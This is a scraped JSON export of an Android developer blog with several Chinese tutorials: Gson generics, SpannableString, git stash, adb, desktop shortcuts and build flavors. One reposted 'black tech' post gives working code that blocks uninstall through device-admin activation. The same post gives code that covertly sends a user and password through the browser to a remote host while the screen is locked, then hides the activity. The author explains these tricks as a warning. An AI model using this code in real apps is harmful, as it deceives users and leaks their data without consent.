\"&#123;\\\"name\\\":\\\"怪盗kidou\\\",\\\"age\\\":24,\\\"emailAddress\\\":\\\"ikidou_1@example.com\\\",\\\"email\\\":\\\"ikidou_2@example.com\\\",\\\"email_address\\\":\\\"ikidou_3@example.com\\\"&#125;\";User user = gson.fromJson(json, User.class);System.out.println(user.emailAddress); // ikidou_3@example.com Gson中使用泛型上面了解的JSON中的Number、boolean、Object和String，现在说一下Array。例：JSON字符串数组 1[&quot;Android&quot;,&quot;Java&quot;,&quot;PHP&quot;] 当我们要通过Gson解析这个json时，一般有两种方式：使用数组，使用List。而List对于增删都是比较方便的，所以实际使用是还是List比较多。数组比较简单 123Gson gson = new Gson();String jsonArray = \"[\\\"Android\\\",\\\"Java\\\",\\\"PHP\\\"]\";String[] strings = gson.fromJson(jsonArray, String[].class); 但对于List将上面的代码中的 String[].class 直接改为 List&lt;String&gt;.class 是行不通的。对于Java来说List&lt;String&gt; 和List&lt;User&gt; 这俩个的字节码文件只一个那就是List.class，这是Java泛型使用时要注意的问题泛型擦除。为了解决的上面的问题，Gson为我们提供了TypeToken来实现对泛型的支持，所以当我们希望使用将以上的数据解析为List&lt;String&gt;时需要这样写。 1234Gson gson = new Gson();String jsonArray = \"[\\\"Android\\\",\\\"Java\\\",\\\"PHP\\\"]\";String[] strings = gson.fromJson(jsonArray, String[].class);List&lt;String&gt; stringList = gson.fromJson(jsonArray, new TypeToken&lt;List&lt;String&gt;&gt;() &#123;&#125;.getType()); 注：TypeToken的构造方法是protected修饰的,所以上面才会写成 1new TypeToken&lt;List&lt;String&gt;&gt;() &#123;&#125;.getType() 而不是 1new TypeToken&lt;List&lt;String&gt;&gt;().getType() 泛型解析对接口POJO的设计影响 泛型的引入可以减少无关的代码，如我现在所在公司接口返回的数据分为两类： 1&#123;&quot;code&quot;:&quot;0&quot;,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&#123;&#125;&#125; 1&#123;&quot;code&quot;:&quot;0&quot;,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:[]&#125; 我们真正需要的data所包含的数据，而code只使用一次，message则几乎不用。如果Gson不支持泛型或不知道Gson支持泛型的同学一定会这么定义POJO。 12345public class UserResponse &#123; public int code; public String message; public User data;&#125; 当其它接口的时候又重新定义一个XXResponse将data的类型改成XX，很明显code，和message被重复定义了多次，通过泛型的话我们可以将code和message字段抽取到一个Result的类中，这样我们只需要编写data字段所对应的POJO即可，更专注于我们的业务逻辑。如： 12345public class Result&lt;T&gt; &#123; public int code; public String message; public T data;&#125; 那么对于data字段是User时则可以写为 Result&lt;User&gt; ,当是个列表的时候为Result&lt;List&lt;User&gt;&gt;，其它同理。 结语本文主要通过代码向各位读者讲解了Gson的基本用法，以后还会更新更多更高级的用法，如果你还不熟悉 注解和泛型 那么你要多多努力啦。如果你有其它的想了解的内容(不限于Gson)请给我留言评论，水平有限，欢迎拍砖。补充 有说看不懂Result那段怎么个简化法，下面给个两个完整的例子，User和List&lt;User&gt; 。没有引入泛型之前时写法： 12345678910111213141516171819public class UserResult &#123; public int code; public String message; public User data;&#125;//=========public class UserListResult &#123; public int code; public String message; public List&lt;User&gt; data;&#125;//=========String json = &quot;&#123;..........&#125;&quot;;Gson gson = new Gson();UserResult userResult = gson.fromJson(json,UserResult.class);User user = userResult.data;UserListResult userListResult = gson.fromJson(json,UserListResult.class);List&lt;User&gt; users = userListResult.data; 上面有两个类UserResult和UserListResult，有两个字段重复，一两个接口就算了，如果有上百个怎么办?不得累死?所以引入泛型。 12345678//不再重复定义Result类Type userType = new TypeToken&lt;Result&lt;User&gt;&gt;()&#123;&#125;.getType();Result&lt;User&gt; userResult = gson.fromJson(json,userType);User user = userResult.data;Type userListType = new TypeToken&lt;Result&lt;List&lt;User&gt;&gt;&gt;()&#123;&#125;.getType();Result&lt;List&lt;User&gt;&gt; userListResult = gson.fromJson(json,userListType);List&lt;User&gt; users = userListResult.data; 看出区别了么?引入了泛型之后虽然要多写一句话用于获取泛型信息，但是返回值类型很直观，也少定义了很多无关类。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"用SpannableString打造绚丽多彩的文本显示效果","slug":"用SpannableString打造绚丽多彩的文本显示效果","date":"2017-07-30T08:03:39.000Z","updated":"2020-05-11T07:23:44.863Z","comments":true,"path":"2017/07/30/用SpannableString打造绚丽多彩的文本显示效果/","link":"","permalink":"https://superxlcr.github.io/2017/07/30/用SpannableString打造绚丽多彩的文本显示效果/","excerpt":"","text":"本文转载自：http://www.jianshu.com/p/84067ad289d2 引语TeXtView大家应该都不陌生，文本展示控件嘛！ 就用TextView显示普普通通的文本，OK，很简单，Android入门的都会，没入门的在门缝外看两眼也都会，哈哈，开玩笑。那要是设计在开发需求中要求类似微信聊天表情一样在TextView中插入表情图片呢？ 有的小伙伴就会说啦，“TextView添加图片我会啊，不就是drawableLeft，drawableRight嘛！” 嗯 ~ 也行，算是一种方法，可这有一个限制，首先，图片只能在TextView的两端，其次，两端都只能设置一张图片。要是图片要在文本中间呢？无能为力了吧，要是你会使用SpannableString，这个问题也就不难解决了，简直是Just So So。所以，不论你是否正在经受以上问题的困扰，亦或是还没有经历到，请驻足仔细耐心的看完这篇简短的文章。不仅能够轻松实现以上设计需求，更能收获其他各种炫酷的效果，也许就能帮助你解决现在你所困扰的问题。 SpannableStringSpannableString其实和String一样，都是一种字符串类型，同样TextView也可以直接设置SpannableString作为显示文本，不同的是SpannableString可以通过使用其方法setSpan方法实现字符串各种形式风格的显示,重要的是可以指定设置的区间，也就是为字符串指定下标区间内的子字符串设置格式。setSpan(Object what, int start, int end, int flags)方法需要用户输入四个参数，what表示设置的格式是什么，可以是前景色、背景色也可以是可点击的文本等等，start表示需要设置格式的子字符串的起始下标，同理end表示终了下标，flags属性就有意思了，共有四种属性： Spanned.SPAN_INCLUSIVE_EXCLUSIVE 从起始下标到终了下标，包括起始下标 Spanned.SPAN_INCLUSIVE_INCLUSIVE 从起始下标到终了下标，同时包括起始下标和终了下标 Spanned.SPAN_EXCLUSIVE_EXCLUSIVE 从起始下标到终了下标，但都不包括起始下标和终了下标 Spanned.SPAN_EXCLUSIVE_INCLUSIVE 从起始下标到终了下标，包括终了下标 下面我们一一解读几种Span常用的格式: ForegroundColorSpan ForegroundColorSpan，为文本设置前景色，效果和TextView的setTextColor()类似，实现方法如下： 1234SpannableString spannableString = new SpannableString(\"设置文字的前景色为淡蓝色\");ForegroundColorSpan colorSpan = new ForegroundColorSpan(Color.parseColor(\"#0099EE\"));spannableString.setSpan(colorSpan, 9, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE); textView.setText(spannableString); 设置的区间是9到字符串的最后，也就是图中“淡蓝色”三字。 BackgroundColorSpan BackgroundColorSpan，为文本设置背景色，效果和TextView的setBackground()类，实现方法如下： 1234SpannableString spannableString = new SpannableString(\"设置文字的背景色为淡绿色\");BackgroundColorSpan colorSpan = new BackgroundColorSpan(Color.parseColor(\"#AC00FF30\"));spannableString.setSpan(colorSpan, 9, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setText(spannableString); RelativeSizeSpan RelativeSizeSpan，设置文字相对大小，在TextView原有的文字大小的基础上，相对设置文字大小，实现方法如下： 123456789101112131415161718SpannableString spannableString = new SpannableString(\"万丈高楼平地起\");RelativeSizeSpan sizeSpan01 = new RelativeSizeSpan(1.2f);RelativeSizeSpan sizeSpan02 = new RelativeSizeSpan(1.4f);RelativeSizeSpan sizeSpan03 = new RelativeSizeSpan(1.6f);RelativeSizeSpan sizeSpan04 = new RelativeSizeSpan(1.8f);RelativeSizeSpan sizeSpan05 = new RelativeSizeSpan(1.6f);RelativeSizeSpan sizeSpan06 = new RelativeSizeSpan(1.4f);RelativeSizeSpan sizeSpan07 = new RelativeSizeSpan(1.2f);spannableString.setSpan(sizeSpan01, 0, 1, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);spannableString.setSpan(sizeSpan02, 1, 2, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);spannableString.setSpan(sizeSpan03, 2, 3, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);spannableString.setSpan(sizeSpan04, 3, 4, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);spannableString.setSpan(sizeSpan05, 4, 5, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);spannableString.setSpan(sizeSpan06, 5, 6, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);spannableString.setSpan(sizeSpan07, 6, 7, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setText(spannableString); StrikethroughSpan StrikethroughSpan，为文本设置中划线，也就是常说的删除线，实现方法如下： 1234SpannableString spannableString = new SpannableString(\"为文字设置删除线\");StrikethroughSpan strikethroughSpan = new StrikethroughSpan();spannableString.setSpan(strikethroughSpan, 5, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setText(spannableString); 看到这有没有小激动，分分钟实现天猫打折优惠效果，有木有？ UnderlineSpan UnderlineSpan，为文本设置下划线，具体实现方法如下： 1234SpannableString spannableString = new SpannableString(\"为文字设置下划线\");UnderlineSpan underlineSpan = new UnderlineSpan();spannableString.setSpan(underlineSpan, 5, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setText(spannableString); SuperscriptSpan SuperscriptSpan，设置上标，具体实现方法如下： 1234SpannableString spannableString = new SpannableString(\"为文字设置上标\");SuperscriptSpan superscriptSpan = new SuperscriptSpan();spannableString.setSpan(superscriptSpan, 5, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setText(spannableString); 从效果图可以看出，被设置为上标的文字大小和下面的文本文字大小一样，只要我们稍加修饰，结合RelativeSizeSpan设置小字体文本作为上标，分分钟实现指数公式有木有，再也不用2^2+3^2=13这样缺乏审美的数学公式了，是不是超实用？ SubscriptSpan SubscriptSpan，设置下标，功能与设置上标类似，不做过多描述，具体实现方法如下： 1234SpannableString spannableString = new SpannableString(\"为文字设置下标\");SubscriptSpan subscriptSpan = new SubscriptSpan();spannableString.setSpan(subscriptSpan, 5, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setText(spannableString); StyleSpan StyleSpan，为文字设置风格（粗体、斜体），和TextView属性textStyle类似，实现方法如下： 1234567SpannableString spannableString = new SpannableString(\"为文字设置粗体、斜体风格\");StyleSpan styleSpan_B = new StyleSpan(Typeface.BOLD);StyleSpan styleSpan_I = new StyleSpan(Typeface.ITALIC);spannableString.setSpan(styleSpan_B, 5, 7, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);spannableString.setSpan(styleSpan_I, 8, 10, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setHighlightColor(Color.parseColor(\"#36969696\"));textView.setText(spannableString); ImageSpan ImageSpan，设置文本图片，实现方法如下： 123456SpannableString spannableString = new SpannableString(\"在文本中添加表情（表情）\");Drawable drawable = getResources().getDrawable(R.mipmap.a9c);drawable.setBounds(0, 0, 42, 42);ImageSpan imageSpan = new ImageSpan(drawable);spannableString.setSpan(imageSpan, 6, 8, Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setText(spannableString); 这一个是不是很炫酷？再加一个解析算法，将文本中特定的文本转换成特定的表情图片，分分钟实现聊天表情显示效果有木有啊朋友们！ ClickableSpan ClickableSpan，设置可点击的文本，设置这个属性的文本可以相应用户点击事件，至于点击事件用户可以自定义，就像效果图显示一样，用户可以实现点击跳转页面的效果，具体实现方法如下： 12345678910111213141516171819202122232425262728293031SpannableString spannableString = new SpannableString(\"为文字设置点击事件\");MyClickableSpan clickableSpan = new MyClickableSpan(\"http://www.jianshu.com/users/dbae9ac95c78\");spannableString.setSpan(clickableSpan, 5, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setMovementMethod(LinkMovementMethod.getInstance());textView.setHighlightColor(Color.parseColor(\"#36969696\")); textView.setText(spannableString);/***************************************************************/class MyClickableSpan extends ClickableSpan &#123; private String content; public MyClickableSpan(String content) &#123; this.content = content; &#125; @Override public void updateDrawState(TextPaint ds) &#123; ds.setUnderlineText(false); &#125; @Override public void onClick(View widget) &#123; Intent intent = new Intent(MainActivity.this, OtherActivity.class); Bundle bundle = new Bundle(); bundle.putString(\"content\", content); intent.putExtra(\"bundle\", bundle); startActivity(intent); &#125;&#125; 代码中我们自定义MyClickableSpan类，继承至ClickableSpan，并重写其中一些方法。ds.setUnderlineText()控制是否让可点击文本显示下划线，很明显，在上面代码中我选择了false，不显示下滑写。onClick点击事件的具体实现方法写在其中。如上代码，我们重写ClickableSpan的onClick方法实现Activity的跳转效果，并传递跳转数据。注意：使用ClickableSpan的文本如果想真正实现点击作用，必须为TextView设置setMovementMethod方法，否则没有点击相应，至于setHighlightColor方法则是控制点击是的背景色。 URLSpan URLSpan，设置超链接文本，其实聪明的小伙帮在讲到ClickableSpan的时候就能实现超链接文本的效果了，重写onClick点击事件就行，也确实看了URLSpan的源码，URLSpan就是继承自ClickableSpan，也和想象中一样，就是重写了父类的onClick事件，用系统自带浏览器打开链接，具体实现方法如下： 123456SpannableString spannableString = new SpannableString(\"为文字设置超链接\");URLSpan urlSpan = new URLSpan(\"http://www.jianshu.com/users/dbae9ac95c78\");spannableString.setSpan(urlSpan, 5, spannableString.length(), Spanned.SPAN_INCLUSIVE_EXCLUSIVE);textView.setMovementMethod(LinkMovementMethod.getInstance());textView.setHighlightColor(Color.parseColor(\"#36969696\"));textView.setText(spannableString); URLSpan onClick事件的源码如下： 123456789101112@Overridepublic void onClick(View widget) &#123; Uri uri = Uri.parse(getURL()); Context context = widget.getContext(); Intent intent = new Intent(Intent.ACTION_VIEW, uri); intent.putExtra(Browser.EXTRA_APPLICATION_ID, context.getPackageName()); try &#123; context.startActivity(intent); &#125; catch (ActivityNotFoundException e) &#123; Log.w(\"URLSpan\", \"Actvity was not found for intent, \" + intent.toString()); &#125;&#125; 除此之外，还有MaskFilterSpan可以实现模糊和浮雕效果，RasterizerSpan可以实现光栅效果，因为以上两个使用频率不高，而且效果也不是很明显，就不做详细说明，有兴趣的小伙伴不妨去试一试。 SpannableStringBuilder应该有不少开发的小伙伴知道StringBuilder，可以使用append()方法实现字符串拼接，非常方便。同样，SpannableString中也有SpannableStringBuilder，顾名思义，就是实现对，SpannableString的一个拼接效果，同样是append()方法，可以实现各种风格效果的SpannableString拼接，非常实用。 彩蛋看了这么多的效果是不是收货满满呢？最后我在附上一个个小小的彩蛋，小伙伴们可以开动脑经想一想是怎么实现的哦！ 要是有更好的创意，不妨在评论区留言跟大伙儿分享分享呢！ github下载地址-内含菜单实现代码","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"git stash和git stash pop","slug":"git-stash和git-stash-pop","date":"2017-07-30T04:12:40.000Z","updated":"2020-05-11T07:23:44.770Z","comments":true,"path":"2017/07/30/git-stash和git-stash-pop/","link":"","permalink":"https://superxlcr.github.io/2017/07/30/git-stash和git-stash-pop/","excerpt":"","text":"本文转载自：http://blog.csdn.net/wh_19910525/article/details/7784901 更多git stash相关介绍可查看：https://git-scm.com/book/zh/v1/Git-%E5%B7%A5%E5%85%B7-%E5%82%A8%E8%97%8F%EF%BC%88Stashing%EF%BC%89 git stash 可用来暂存当前正在进行的工作， 比如想pull 最新代码， 又不想加新commit， 或者另外一种情况，为了fix 一个紧急的bug, 先stash, 使返回到自己上一个commit, 改完bug之后再stash pop, 继续原来的工作。 基础命令： 12345git stashdo some workgit stash pop 进阶： Git stash save “work in progress for foo feature” 当你多次使用’git stash’命令后，你的栈里将充满了未提交的代码，这时候你会对将哪个版本应用回来有些困惑，’git stash list’ 命令可以将当前的Git栈信息打印出来，你只需要将找到对应的版本号，例如使用’git stash apply stash@{1}’就可以将你指定版本号为stash@{1}的工作取出来，当你将所有的栈都应用回来的时候，可以使用’git stash clear’来将栈清空。 1234567git stash # save uncommitted changes# pull, edit, etc.git stash list # list stashed changes in this gitgit show stash@&#123;0&#125; # see the last stash git stash pop # apply last stash and remove it from the listgit stash --help # for more info","categories":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/tags/git/"}]},{"title":"adb常用命令总结","slug":"adb常用命令总结","date":"2017-07-29T15:39:49.000Z","updated":"2020-05-11T07:23:44.768Z","comments":true,"path":"2017/07/29/adb常用命令总结/","link":"","permalink":"https://superxlcr.github.io/2017/07/29/adb常用命令总结/","excerpt":"","text":"adb介绍ADB，即 Android Debug Bridge，它是 Android 开发/测试人员不可替代的强大工具，也是 Android 设备玩家的好玩具。借助adb工具，我们可以管理设备或手机模拟器的状态。还可以进行很多手机操作，如安装软件、系统升级、运行shell命令等等。 开启关闭adb服务 关闭adb服务：adb kill-server 开启adb服务：adb start-server 查看当前连接的设备adb devices 安装和卸载apk程序 安装apk：adb install &lt;apk_name&gt; 卸载apk：adb uninstall &lt;apk_name&gt; 上传和下载文件 上传文件：adb push &lt;本地文件&gt; &lt;远程路径&gt; 下载文件：adb pull &lt;远程文件&gt; &lt;本地路径&gt; 显示和导出log信息 显示log：adb logcat 导出log信息：adb logcat &gt; 1.txt adb获取root权限 adb以root权限执行：adb root adb回收root权限：adb unroot 启动adb命令行adb shell adb截屏并下载到电脑adb exec-out screencap -p &gt; picture_name.png 更多adb命令可见：https://github.com/mzlogin/awesome-adb","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Android 黑科技小结","slug":"Android-黑科技小结","date":"2017-07-24T11:53:05.000Z","updated":"2020-05-11T07:23:44.543Z","comments":true,"path":"2017/07/24/Android-黑科技小结/","link":"","permalink":"https://superxlcr.github.io/2017/07/24/Android-黑科技小结/","excerpt":"","text":"转载自：http://www.jianshu.com/p/8f9b44302139 桌面添加快捷方式不知道大家有没有被这种流氓软件袭击过，你打开过他一次，后面就泪流满面的给你装了满满的一屏幕其他乱七八糟的一堆快捷方式。注意可能会误认为被偷偷安装了其他App，实际上他只是一个带图标的Intent在你的桌面上，但不排除root后的机器安装app是真的，但我们今天这里只讲快捷方式。 快捷方式有什么用？ 1.可以给用户一个常用功能的快捷入口（推荐） 2.搭配插件化技术实现模拟安装后的app体验（推荐） 3.做黑产（黑色产业链的东西我不想说了，只需要记得咱们是有原则的开发者，坚决抵制做垃圾App。即使别人给钱也不做。就这么任性 （ˇ＾ˇ〉） 原理解析： 我们已经把AndroidManifest写烂了，一眼看过去就知道这个标签的作用。 123456 &lt;activity android:name=\".xxx\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt;&lt;/activity&gt; 没错，我们再熟悉不过了，一般我们理解成将作为App的第一个被启动的Activity声明。实际上我们知道Android的桌面（launcher ，一般做rom层的同学接触比较多）上点击任意一个app都是通过Intent启动的。神曾经说过，不懂的地方。read the fucking source code，那么我们来趴一趴launcher的源码，它是如何接收到我们要添加的快捷方式的。（别害怕，源码没有想象中那么难度，跳着看。屏蔽我们不关注的部分。） 拿到一个Android应用层的项目第一件事情干嘛？看配置文件呗。来我们瞅一眼launcher的AndroidManifest。 123456789101112131415161718192021222324&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.android.launcher\"&gt; &lt;!--为了便于阅读，我省略了跟本篇无关紧要的代码 --&gt; &lt;!-- Intent received used to install shortcuts from other applications --&gt; &lt;receiver android:name=\"com.android.launcher2.InstallShortcutReceiver\" android:permission=\"com.android.launcher.permission.INSTALL_SHORTCUT\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.android.launcher.action.INSTALL_SHORTCUT\" /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;!-- Intent received used to uninstall shortcuts from other applications --&gt; &lt;receiver android:name=\"com.android.launcher2.UninstallShortcutReceiver\" android:permission=\"com.android.launcher.permission.UNINSTALL_SHORTCUT\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.android.launcher.action.UNINSTALL_SHORTCUT\" /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;/manifest&gt; 注意我们发现了两个receiver标签，从上面的注释可以发现 &lt;!– Intent received used to install shortcuts from other applications –&gt; 接收其他应用安装的快捷方式意图。这里就表明了launcher 是通过广播来添加快捷方式的。我们接着翻源码，看他是怎么处理这条广播的。根据receiver里的name标签我们找到InstallShortcutReceiver.java这个类。首先我们发现他继承了BroadcastReceiver ，很明显就是一个广播接收者，我们直接看onReceive方法里如何处理的。 123456789101112131415161718192021222324252627//代码细节部分省略太长了，不方便贴。可以自己去下载源码看。public class InstallShortcutReceiver extends BroadcastReceiver &#123; //做了很多处理，比如寻找将接受到的快捷方式放在屏幕的哪个位置、重复的图标提示等 public void onReceive(Context context, Intent data) &#123; //判断这条广播的合法性 if (!ACTION_INSTALL_SHORTCUT.equals(data.getAction())) &#123; return; &#125; ····· &#125; //最终我们发现了这个方法，将快捷方式添加到桌面并存储到数据库 private static boolean installShortcut(Context context, Intent data, ...参数省略) &#123; ····· if (intent.getAction() == null) &#123; intent.setAction(Intent.ACTION_VIEW); &#125; else if (intent.getAction().equals(Intent.ACTION_MAIN) &amp;&amp; intent.getCategories() != null &amp;&amp; intent.getCategories().contains(Intent.CATEGORY_LAUNCHER)) &#123; intent.addFlags( Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED); &#125; ···· &#125; ····｝ 重点看下面这几行，顺藤摸瓜得知这个Intent来自来自别的app或系统发过来的广播。下面黄横线的部分已经解释了，我们自己平时开发的app配置的主启动项Activitiy intent-filter在哪里被用到了。这里接收到后的intent将加到桌面并存储到数据库中。由此算是明白了系统到底是怎么做的。 实现添加快捷方式：好，既然已经知道原理了，我们现在就来实现一把，怎么添加一个任意的图标到桌面。首先我们需要配置权限声明 12&lt;uses-permission android:name=\"com.android.launcher.permission.INSTALL_SHORTCUT\" /&gt;&lt;uses-permission android:name=\"com.android.launcher.permission.UNINSTALL_SHORTCUT\" /&gt; 第二步捏造一个添加快捷方式的广播，具体请看下面的代码。注意里面有两个Intent，其中一个是广播的，一个是我们自己下次启动快捷方式时要用的，启动时可以携带Intent参数。（能做什么，知道了吧？哈哈）下面们调用一下看看。这里我添加了四个快捷方式，分别是abcd、abc、ab、a，然后我们返回桌面看一眼。他们都是可以启动的。 1234567891011121314151617181920public static void addShortcut(Activity cx, String name) &#123; // TODO: 2017/6/25 创建快捷方式的intent广播 Intent shortcut = new Intent(\"com.android.launcher.action.INSTALL_SHORTCUT\"); // TODO: 2017/6/25 添加快捷名称 shortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, name); // 快捷图标是允许重复 shortcut.putExtra(\"duplicate\", false); // 快捷图标 Intent.ShortcutIconResource iconRes = Intent.ShortcutIconResource.fromContext(cx, R.mipmap.ic_launcher); shortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, iconRes); // TODO: 2017/6/25 我们下次启动要用的Intent信息 Intent carryIntent = new Intent(Intent.ACTION_MAIN); carryIntent.putExtra(\"name\", name); carryIntent.setClassName(cx.getPackageName(),cx.getClass().getName()); carryIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP); //添加携带的Intent shortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, carryIntent); // TODO: 2017/6/25 发送广播 cx.sendBroadcast(shortcut);&#125; github地址：https://github.com/BolexLiu/AddShortcut 无法卸载app(DevicePolicManager)DevicePolicManager 可以做什么？ 1.恢复出厂设置 2.修改屏幕解锁密码 3.修改屏幕密码规则长度和字符 4.监视屏幕解锁次数 5.锁屏幕 6.设置锁屏密码有效期 7.设置应用数据加密 8.禁止相机服务，所有app将无法使用相机 首先我想，如果你是一个Android重度体验用户，在Rom支持一键锁屏之前，你也许装过一种叫快捷锁屏、一键锁屏之类的替代实体键锁屏的应用。其中导致的问题就是当我们不需要用它的时候却发现无法被卸载。原理解析： 从功能上来看，本身该项服务是用来控制设备管理，它是Android用来提供对系统进行管理的。所以一但获取到权限，不知道Android出于什么考虑,系统是不允许将其卸载掉的。我们只是在这里钻了空子。实现步骤： 继承DeviceAdminReceiver类，里面的可以不要做任何逻辑处理。 12public class MyDeviceAdminReceiver extends DeviceAdminReceiver &#123;&#125; 注册一下，description可以写一下你给用户看的描述。 12345678910111213&lt;receiver android:name=\".MyDeviceAdminReceiver\" android:description=\"@string/description\" android:label=\"防卸载\" android:permission=\"android.permission.BIND_DEVICE_ADMIN\" &gt; &lt;meta-data android:name=\"android.app.device_admin\" android:resource=\"@xml/deviceadmin\" /&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\" /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 调用系统激活服务 123456789// 激活设备超级管理员public void activation() &#123; Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN); // 初始化要激活的组件 ComponentName mDeviceAdminSample = new ComponentName(MainActivity.this, MyDeviceAdminReceiver.class); intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample); intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, \"激活可以防止随意卸载应用\"); startActivity(intent);&#125; 我们来看下运行的效果。激活以前是可以被卸载的。 激活以后无法被卸载，连删除按钮都没有了。就算你拿其他安全工具或系统的卸载也不能卸载哦。 但是我们可以在设备管理器中可以取消激活就恢复了。这里我们是正常的方式来激活，不能排除root后的设备，当app拿到root权限后将自己提权自动激活，或者将自身写入到系统app区域，达到无法卸载的目的。所以我们常说root后的设备是不安全的也就在这里能说明问题。github地址：https://github.com/BolexLiu/SuPerApp 无网络权限偷偷上传数据这是一种超流氓的方式，目前市面上是存在这种app的。普通用户不太注意的话一般发现不了。另一个对立面说用户把app的访问网络权限禁用了如何告诉服务器消息呢？原理解析： 虽然应用没有权限，或者我们之前有权限被用户屏蔽了。但是我们可以借鸡下蛋，调用系统浏览器带上我们要访问的参数。实际在服务端收到的时候就是一个get请求可以解析后面拼接出的参数。比如： 1http://192.168.0.2/send?user=1&amp;pwd=2 这样就可以把user和pwd提交上去。当然这一切还不能被用户发现，所以很变态的判断用户锁屏后就打开浏览器发送消息，用户一旦解锁就回到桌面上，假装一切都没有发生过。 实现代码： 本来我不准备把代码贴出来的，但想了一下又有何妨。即便我不贴出来你也能找到，也能跟着思路写出来。但是千万千万不要给用户做这种东西。拜托了各位。 123456789101112131415161718192021222324252627Timer timer = new Timer(); final KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE); TimerTask task = new TimerTask() &#123; @Override public void run() &#123; // TODO: 2017/6/26 如果用户锁屏状态下，就打开网页通过get方式偷偷传输数据 if (km.inKeyguardRestrictedInputMode()) &#123; Intent intent = new Intent(); intent.setAction(Intent.ACTION_VIEW); intent.addCategory(Intent.CATEGORY_BROWSABLE); intent.setData(Uri .parse(\"http://192.168.0.2/send?user=1&amp;pwd=2\")); intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); &#125;else&#123; // TODO: 2017/6/26 判断如果在桌面就什么也不做 ,如果不在桌面就返回 Intent intent = new Intent(); intent.setAction(\"android.intent.action.MAIN\"); intent.addCategory(\"android.intent.category.HOME\"); intent.addCategory(Intent.CATEGORY_DEFAULT); intent.addCategory(\"android.intent.category.MONKEY\"); intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); &#125; &#125; &#125;; timer.schedule(task, 1000, 2000);","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Android生成渠道包总结","slug":"Android生成渠道包总结","date":"2017-07-20T12:46:54.000Z","updated":"2020-05-11T07:23:44.604Z","comments":true,"path":"2017/07/20/Android生成渠道包总结/","link":"","permalink":"https://superxlcr.github.io/2017/07/20/Android生成渠道包总结/","excerpt":"","text":"最近在工作上了解了一些与渠道包相关的信息，在此进行一下总结。 什么是渠道包每当发新版本时，我们编写的Android客户端应用会被分发到各个应用市场，比如豌豆荚，360手机助手等。为了统计应用这些市场的效果（活跃数，下单数等），我们需要有一种唯一标识来区分它们。渠道号就是我们用来区分不同市场的唯一标识，比方说，发布到豌豆荚市场的应用的渠道号是“wandoujia”，而发布到360手机助手的应用的渠道号则为“qihu360”。带有渠道号的包即是渠道包，当我们的应用进行打点汇报等操作时，往往会把渠道包中的渠道信息一同上传，以便后台接下来计算不同渠道的效果。 Gradle构筑渠道包的方法在Android的Gradle中，它为我们提供了Flavor属性用于构建不同渠道的渠道包，使用方法如下：File -&gt; Project Structure -&gt; Flavors 选项卡设置Flavors过后，我们的build.gradle文件将会添加上对应的代码（当然我们也可以手动直接编写代码）： Gradle提供的Flavors允许我们设置多种多样的属性，而我们可以通过Gradle生成的BuildConfig类来读取当前渠道包的相关信息： 1BuildConfig.FLAVOR 